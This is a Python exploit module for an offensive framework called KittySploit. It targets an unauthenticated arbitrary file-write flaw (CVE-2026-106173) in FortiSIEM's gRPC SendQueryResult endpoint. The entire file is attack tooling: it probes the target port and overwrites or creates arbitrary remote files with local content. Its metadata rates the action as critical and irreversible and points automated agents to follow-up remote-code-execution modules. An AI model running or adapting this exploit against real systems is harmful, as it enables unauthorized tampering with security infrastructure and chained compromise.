#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-106173 — FortiSIEM unauthenticated arbitrary file write (blind).

Auxiliary: overwrite/create only — no KittySploit session.
For delayed RCE with a CMD payload, use exploits/multi/tcp/fortisiem_cve_2026_106173_rce.
"""

from __future__ import annotations

import pathlib

from kittysploit import *
from lib.protocols.http2.fortisiem_grpc import Fortisiem_grpc_write
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Auxiliary, Tcp_scanner_client, Fortisiem_grpc_write):
    __info__ = {
        "name": "FortiSIEM SendQueryResult Arbitrary File Write (CVE-2026-106173)",
        "description": (
            "CVE-2026-106173: unauthenticated path traversal and embedded NUL in "
            "SendQueryResult (gRPC/HTTP/2, TCP 27918). Overwrite or create arbitrary "
            "files — blind, no session."
        ),
        "author": ["Horizon3 Attack Team", "KittySploit Team"],
        "cve": ["CVE-2026-106173"],
        "platform": Platform.LINUX,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-106173",
            "https://github.com/horizon3ai/CVE-2026-106173",
        ],
        "tags": ["fortinet", "fortisiem", "grpc", "http2", "file-write", "unauth", "auxiliary"],
        "agent": {
            "risk": "critical",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "requires": {"tech_hints_any": ["fortisiem", "fortinet"]},
            "chain": {
                "suggested_followups": [
                    "exploits/multi/tcp/fortisiem_cve_2026_106173_rce",
                    "exploits/multi/tcp/fortisiem_cve_2025_64155_rce",
                    "scanner/http/fortisiem_detect",
                ],
            },
        },
    }

    write_mode = OptEnum(
        ["overwrite", "create"],
        "overwrite | create",
        required=False,
        default="overwrite",
        advanced=True,
    )
    local_file = OptString("", "Local file to upload", required=False, advanced=True)
    remote_overwrite = OptString("", "Remote path to overwrite", required=False, advanced=True)
    remote_create = OptString("", "Remote path to create", required=False, advanced=True)

    def _host(self) -> str:
        host = super()._host()
        if host:
            return host
        raw = str(getattr(self, "rhost", None) or getattr(self, "target", "") or "")
        if hasattr(raw, "value"):
            raw = raw.value
        return raw.split("://")[-1].split("/")[0].split(":")[0]

    def check(self) -> bool:
        host = self._host()
        if not host:
            print_error("Set target")
            return False
        ok, reason = self.probe_http2(host, self._grpc_port())
        if ok:
            print_status(reason)
            return True
        if self.is_tcp_open(host, self._grpc_port()):
            print_warning(f"TCP open; HTTP/2 probe failed: {reason}")
            return True
        print_error(reason)
        return False

    def run(self):
        host = self._host()
        if not host:
            print_error("Set target")
            return False

        print_status("CVE-2026-106173 — FortiSIEM SendQueryResult file write (blind)")
        if not self.check():
            return False

        mode = str(self.write_mode or "overwrite").strip()
        try:
            if mode == "overwrite":
                remote = str(self.remote_overwrite or "").strip()
                local = str(self.local_file or "").strip()
                if not remote or not local:
                    print_error("overwrite mode requires remote_overwrite and local_file")
                    return False
                self.fortisiem_overwrite_remote(
                    host,
                    pathlib.PurePosixPath(remote),
                    pathlib.Path(local).read_bytes(),
                )
            elif mode == "create":
                remote = str(self.remote_create or "").strip()
                local = str(self.local_file or "").strip()
                if not remote or not local:
                    print_error("create mode requires remote_create and local_file")
                    return False
                self.fortisiem_create_remote(
                    host,
                    pathlib.PurePosixPath(remote),
                    pathlib.Path(local).read_bytes(),
                )
            else:
                print_error(f"Unknown write_mode: {mode}")
                return False
        except (OSError, RuntimeError, ValueError) as exc:
            print_error(str(exc))
            return False

        dry = self.dry_run
        if hasattr(dry, "value"):
            dry = dry.value
        print_success("Dry run complete" if dry else "Request(s) sent")
        return True
